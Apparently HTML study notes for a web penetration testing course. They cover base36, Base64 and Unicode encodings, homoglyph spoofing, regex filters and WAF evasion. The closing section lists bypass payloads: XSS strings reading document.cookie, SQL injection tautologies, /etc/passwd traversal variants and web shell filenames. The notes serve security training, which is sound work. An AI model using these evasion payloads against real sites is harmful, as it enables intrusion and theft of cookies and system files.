href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="463bd924-f6bc-47e6-a7f7-43ab0925d878" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">PHP uses the base_convert() function to convert numbers:
+
+OHPE is Base 10 is &lt;?=base_convert(&quot;OHPE&quot;,36,10);?&gt;
+</code></pre><p id="f1a9109f-02d4-430a-a1aa-f389285cc0de" class=""><strong>JavaScript</strong> JavaScript used two functions:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ed6e707c-5571-4917-ba47-02f6c1a98ffc" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">(1142690.toString(36)
+1142690..toString(36) #encode
+parseInt(&quot;ohpe&quot;,36)   #decode
+</code></pre><h3 id="ab1e4832-098f-482b-90a7-e30093322a95" class=""><strong>Base64 Encoding Scheme</strong></h3><p id="128c8ef0-d794-4848-a562-6618072f02d5" class="">Base64 is one of the most widespread binary-to-text encoding schemes to date. It was designed to allow binary data to be represented as ASCII string text.</p><figure id="efb9cf72-34d2-4d95-a41c-dd59f5b8b7ad" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/35.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/35.png"/></a></figure><ul id="cd8509e1-8ec7-4dc2-896c-f824a2d75bb5" class="bulleted-list"><li style="list-style-type:disc">The alphabet of the Base64 encoding scheme is composed of digits [0-9] and Latin letters, both upper and lower case [a-zA-Z], For a total of 62 values. To complete the character set to 64 there are the plus (+) and slash (/) characters.</li></ul><ul id="6fdfe091-2d14-472e-9189-4e1c16747634" class="bulleted-list"><li style="list-style-type:disc">Moreover: http://en.wikipedia.org/wiki/Base64#Implementations_and_history</li></ul><p id="cdca5d04-4e12-47a7-8e68-586c81f1ceb0" class="">The algorithm divides the message into groups of 6 bits* and then converts each group, with the respective ASCII character, following the conversion table.</p><figure id="5a8bc70e-a1c4-4567-a911-884ca8b3d90d" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/36.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/36.png"/></a></figure><figure id="18fef129-040f-4134-9029-89df897c1a3e" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/37.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/37.png"/></a></figure><figure id="24d8897f-6cae-4a1d-a1d9-983bc017e3ac" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/38.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/38.png"/></a></figure><p id="2d21c93c-070d-4faa-9ee4-bd920e48d766" class="">Thats why the allowed characters are 64 (2 raised to 6th power = 64)</p><ul id="5d039f61-9262-42a2-b13b-4363a81bf594" class="bulleted-list"><li style="list-style-type:disc">If the lastest gruop is <strong>null</strong>(000000) the respective encoding value is <strong>=</strong></li></ul><ul id="97601fce-41c2-40ef-93ab-cb724397a7e6" class="bulleted-list"><li style="list-style-type:disc">If the traiing <strong>null groups</strong> are two, then will be encoded as <strong>==</strong></li></ul><p id="9d53ebab-ae23-42e5-a837-bbb2851b9d63" class=""><strong>PHP</strong> PHP used base64_encode and base64_decode functions based on MIME Base64 implementation:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="2b003942-87d2-42d4-8deb-2e4527f08565" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">&lt;?=base64_encode(&#x27;encode this string&#x27;)?&gt; //encode
+&lt;?=base64_decode(&#x27;ZW5jb2RlIHRoaXMgc3RyaW5n&#x27;)?&gt; //decode
+</code></pre><p id="6e557899-09d7-4584-9250-7aaf79a87c39" class=""><strong>JavaScript</strong> Many browsers can handle base64 natively through function <strong>btoa</strong> and <strong>atob</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d84a3f49-14d6-45ed-acd8-7b81ce3c4c39" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">window.btoa(&#x27;encode this string&#x27;); //encode
+window.atob(&#x27;ZW5jb2RlIHRoaXMgc3RyaW5n&#x27;); //decode
+</code></pre><p id="8527c21d-9a19-4d67-b113-74aa7e6164f3" class="">Moreover: https://developer.mozilla.org/en-US/docs/Web/API/Window.btoa</p><h3 id="946717ec-ccb1-4ec2-ade1-b97d0a6ab9c1" class=""><strong>Unicode encoding</strong></h3><p id="b8b6c9c3-9186-4056-a5f7-e9137443cfaf" class="">Unicode aka ISO/IEC 10646 Universal Character Set. It can expose web applications to possible security attacks, like bypass filters.</p><ul id="b8967d74-2587-4214-9b52-78a76352c370" class="bulleted-list"><li style="list-style-type:disc">http://www.joelonsoftware.com/articles/Unicode.html</li></ul><figure id="f6f05f2e-4d0f-4ba0-a6f7-3b4e516bb623" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/39.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/39.png"/></a></figure><figure id="be55232c-65b7-46d7-8400-b0945a669c95" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/40.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/40.png"/></a></figure><p id="0d54818e-b241-4630-a8ed-861082047d97" class="">UTF = Unicode Transformation Format:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="5fd13f03-1918-4210-8ee5-d6dd30d3e2ce" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- UTF-8
+- UTF-16
+- UTF-32
+</code></pre><h3 id="74e2e918-6ceb-4507-8572-43c488a0fc2e" class=""><strong>Homoglyph | Visual Spoofing</strong></h3><p id="fa78dde0-1b54-4c8f-9631-59c515acc052" class="">In typography, a <strong>Homoglyph</strong> is one or two or more characters, or glyphs, with shapes that either appear identical or cannot be differentiated by quick visual inspection. -Wikipedia</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="45878646-7abf-4b17-8d39-d67e1a48ca65" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Homograph - a word that looks the same as another word
+Homogliph - a look-like character used to create homographs
+
+Example:
+Visual Sp&#x27;oo&#x27;fing = U+006F (Latin small letter o)
+U+03BF (Greek small letter omicron)
+</code></pre><figure id="b41960c9-b172-4c71-ba89-0544d18a7b0b" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/41.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/41.png"/></a></figure><figure id="d23a65fc-87bb-445f-a3da-bb91294e05af" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/42.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/42.png"/></a></figure><p id="5b611da6-704e-4cfb-9ca2-c1b42568fa7e" class="">Moreover Confusables: http://unicode.org/cldr/utility/confusables.jsp</p><p id="71e8afcf-02fa-4adb-ae2e-73f0dfb7b84e" class="">Homoglyph Attack Generator: http://www.irongeek.com/homoglyph-attack-generator.php</p><p id="5dc9597b-50aa-4a39-8bc1-40e239ca78b6" class="">Article about Homoglyph and Punycode attacks: http://www.irongeek.com/i.php?page=security/out-of-character-use-of-punycode-and-homoglyph-attacks-to-obfuscate-urls-for-phishing</p><p id="dd23ba29-0506-4fdf-a115-9976b7ece3b9" class="">They can bypass anti cross-site scripting and SQL Injection filters;</p><ul id="dce7bf94-3446-48e1-9a37-885eea6e4fd9" class="bulleted-list"><li style="list-style-type:disc">Create usernames and Spotify account hijacking: http://labs.spotify.com/2013/06/18/creative-usernames/</li></ul><blockquote id="54f664e1-8943-4500-ae47-3d8e06ee28cf" class="">There are other ways in which characters and strings can be transformed by software processes, such as normalization, canonicalization, best fit mapping, etc</blockquote><figure id="a626f214-2050-44ba-aa91-7bd913d4d0fb" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/43.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/43.png"/></a></figure><figure id="f69bf3a2-ce79-4577-a717-939baf861826" class="image"><a href="https://johnermac.github.io/assets/images/posts/ewptx/44.png"><img src="https://johnermac.github.io/assets/images/posts/ewptx/44.png"/></a></figure><p id="3b43aec9-7aff-4c45-90b0-5e1d0f79290e" class="">→ Moreover: http://websec.github.io/unicode-security-guide/</p><h2 id="6fbc2ecb-a745-46d4-9d55-d62f263c33c0" class=""><strong>Extra Resources</strong></h2><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0c5bf7ca-ebd9-4c89-9def-7c2e41a452ef" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- http://unicode.org/cldr/utility/
+- http://codepoints.net/
+- http://txtn.us/
+- http://www.panix.com/~eli/unicode/convert.cgi
+</code></pre><h3 id="b48d289b-9417-47f6-94b9-59107a0f6c04" class=""><strong>Multiple (De|En) Codings</strong></h3><ul id="ae96c238-2f5a-4da1-9ec7-173748425096" class="bulleted-list"><li style="list-style-type:disc">Its common to abuse multiple encodings to bypass security measures<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="49203442-dac6-4ba0-b21c-f82f8ba88ce1" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">URL-Encoding &gt; URL
+</code></pre></li></ul><h2 id="540a7cdb-9c9b-4c6d-bfda-faa77b2564b5" class=""><strong>Filtering Basics</strong></h2><blockquote id="eca27579-d177-4f94-86b1-5b5c658981dc" class="">A common, yet often recommended, best practice to protect web applications against malicious attacks is the use of specific input filtering and output encoding controls.</blockquote><p id="dbae8387-438d-4b45-86ba-0c5e87f511a6" class="">These kings of controls may range from naive blacklists to experienced and higly restrictive whitelists. What about in the real world? We are somewhere in the middle!</p><ul id="54b92bf3-635e-4800-9685-6a88cf410e2d" class="bulleted-list"><li style="list-style-type:disc">Control can be implemented at different layers in a web application. They can be represented as either libraries and APIs, or in the best case, by internal specialits or external organizations, like ESAPI by OWASP.</li></ul><ul id="5986a8f0-f923-49e0-974d-a2123d010cda" class="bulleted-list"><li style="list-style-type:disc">https://www.owasp.org/index.php/Category:OWASP_Enterprise_Security_API</li></ul><ul id="3fd62bfa-705e-49f3-87e2-261ad8d78746" class="bulleted-list"><li style="list-style-type:disc">Security Controls are also inside most common browsers.</li></ul><p id="6f6783f8-010f-496c-aa9d-7f252727fb84" class="">Generally, these solutions fall into the IDS and IPS world, but FOr Web Applications, the most chosen are the Web Application Firewall (WAFs)</p><p id="2d80c2e8-4c3f-4f06-b5ce-2fe4ea23cb53" class="">A free and open source solution: http://www.modsecurity.org/</p><h3 id="10eefc7c-41f3-45bb-bad7-e9f8dcca79e0" class=""><strong>Regular Expressions (RE or RegEx)</strong></h3><ul id="2f83949d-c5e1-46a0-b2ce-9473d80b15fb" class="bulleted-list"><li style="list-style-type:disc">Represents the official way used to define the filter rules. Mastering RegEx is fundamental to understand how to bypass filters because RE are extremely powerful.</li></ul><ul id="363acd71-6e86-45a9-b8cb-8a9e2df39e9a" class="bulleted-list"><li style="list-style-type:disc">Its a special sequence of characters used For describing a search pattern.</li></ul><p id="94bc1f47-38e9-4648-afe1-93667e319bd8" class="">→ regular expression = regex</p><p id="d916a85e-9f14-4e5f-94bd-fbe812dd4fc3" class="">→ pattern matched = match</p><h3 id="8211da1b-632c-477a-a49d-cbb61a6c43bf" class=""><strong>Two main types</strong></h3><ul id="aaa30067-8f4a-4219-b848-dfef87c659c2" class="bulleted-list"><li style="list-style-type:disc">DFA = http://en.wikipedia.org/wiki/Deterministic_finite_automaton</li></ul><ul id="8e61692c-2e7b-4707-980f-a67028581b3c" class="bulleted-list"><li style="list-style-type:disc">NFA = http://en.wikipedia.org/wiki/Nondeterministic_finite_automaton</li></ul><table id="9febfaad-a716-4cfd-94b8-6ee4b8e6cf15" class="simple-table"><tbody><tr id="6089ca91-c2c9-4655-bf18-6eb660cbc0f0"><td id="uCYu" class="">Engine</td><td id="KE_=" class="">Program</td></tr><tr id="bcf65de2-c2de-4b97-8a9d-a42bd7b7ec8f"><td id="uCYu" class="">DFA</td><td id="KE_=" class="">awk, egrep, MySQL, Procmail</td></tr><tr id="ab4f44e0-f15e-4724-80cc-465ccd9cbfae"><td id="uCYu" class="">NFA</td><td id="KE_=" class="">.NET languages, Java, Perl, PHP, Python, Ruby, PCRE library, vi, grep, less, more</td></tr></tbody></table><p id="75354b23-ea76-4341-839e-b64c478a4abd" class="">Comparison of regular expression engines: http://en.wikipedia.org/wiki/Comparison_of_regular_expression_engines</p><p id="8013ccea-a51a-482c-8134-46e1aea00fe7" class="">Regular Expression Flavor Comparison: http://www.regular-expressions.info/refflavors.html</p><p id="64205878-871b-4747-866f-1afbb99bd15f" class=""><strong>Non-printing characters</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1b17e5e4-641f-44c6-9e99-ae9f7f18cb87" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">its used to evade bad filters and obfuscate the payload.
+</code></pre><p id="fb42b361-dc8d-4d52-a9c6-a76c9e362e42" class=""><strong>Match Unicode Code Point</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bf6c94fd-2f5b-45a2-a62e-df86f00dfce0" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">Regular expression flavors that work with Unicode use specific meta-sequences to match code points.
+The sequence is \ucode-point, where code-point is the hexadecimal number of the character to match.
+There are regex flavors like PCRE that do not support the former notation,
+but use an alternative sequence \x{code-point} in its place.
+</code></pre><p id="d6ce0225-c466-43ec-91cf-61dc4531bd71" class="">example:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="1375fc84-0dc1-426c-92f6-4dac94644b0b" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">\u2603   = the snowman character in .NET, Java, Javascript and Python
+\x{2603} = the snowman character in Apache and PHP (PCRE library)
+</code></pre><p id="c530d41e-b45e-41d7-a197-4fe339b99555" class=""><strong>Meta-sequence Quality</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ea749b74-06cb-4b92-9754-f0c947abf19e" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">\p{quality-id} = have a specific quality
+\P{quality-id} = do not have quality
+</code></pre><p id="91c2eb87-db1e-4d34-96ce-b685c2e7055e" class=""><strong>Match Unicode Category</strong>:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="449de9da-d13d-435c-9a92-ce18ee7002b6" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all"># To match the string with all the case variations (lower, upper and title), this regex does the job:
+[\p{Ll}\p{Lu}\p{Lt}]
+
+# As a shorthand, some regex flavors implement this solution:
+\p{L&amp;}
+</code></pre><h2 id="ef3f99d9-5693-4f6f-8456-c4009204ed29" class=""><strong>Web Application Firewal - WAF</strong></h2><p id="8e938835-ba17-43b6-ac33-8bfe8983e563" class="">ByPass WAFs</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="610740c0-5bd3-46ab-a7b2-96bc7e89ae7a" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">|-| = instead of using this
+|→| = the best choice is
+</code></pre><h3 id="47296801-983a-47e6-ba93-5a8b230dcfb5" class=""><strong>Cross-Site Scripting:</strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="09ac0980-3cf1-4777-a543-b9a9e8a05ec5" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- alert(&#x27;xss&#x27;)
+- alert(1)
+→ prompt(&#x27;xss&#x27;)
+→ prompt(8)
+→ confirm(&#x27;xss&#x27;)
+→ confirm(8)
+→ alert(/xss/.source)
+→ window[/alert/.source](8)
+
+- alert(document.cookie)
+→ with(document)alert(cookie)
+→ alert(document[&#x27;cookie&#x27;])
+→ alert(document[/cookie/.source])
+→ alert(document[/coo/.source+kie/.source])
+
+- &lt;img src=x onerror=alert(1);&gt;
+→ &lt;svg/onload=alert(1)&gt;
+→ &lt;video src=x onerror=alert(1);&gt;
+→ &lt;audio src=x onerror=alert(1);&gt;
+
+- javascript:alert(document.cookie)
+→ data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
+</code></pre><h3 id="46079c0b-5a10-4e7a-9100-f5af25b176a6" class=""><strong>Blind SQL Injection</strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="c850a472-df1a-4936-9e4a-8b8711a0b4e8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- &#x27;or 1=1           &#x27;
+- &#x27;or 6=6           &#x27;
+→ &#x27;or 0x47=0x47     &#x27;
+- or char(32)=&#x27;&#x27;
+→ or 6 is not null
+</code></pre><h3 id="cd02ad14-1191-43b4-9060-526d4be9238c" class=""><strong>SQL Injection</strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="644fba4d-22d1-46c4-bf96-05d01ce1350e" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- UNION SELECT
+→ UNION ALL SELECT
+</code></pre><h3 id="99fe06de-e79b-485b-8012-94e419796a20" class=""><strong>Directory Traversal</strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="266cffb2-80bc-40f9-b1dc-6ec0c5e555ca" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- /etc/passwd
+→ /too/../etc/far/../passwd
+→ /etc//passwd
+→ /etc/ignore/../passwd
+→ /etc/passwd........
+</code></pre><h3 id="eb5275b4-814f-4d59-aba7-c499b307898e" class=""><strong>Web Shell</strong></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4c1217a2-82bd-46bd-9dbe-ddb7efea002c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">- c99.php
+- r57.php
+- shell.aspx
+- cmd.jsp
+- CmdAsp.asp
+→ augh.php
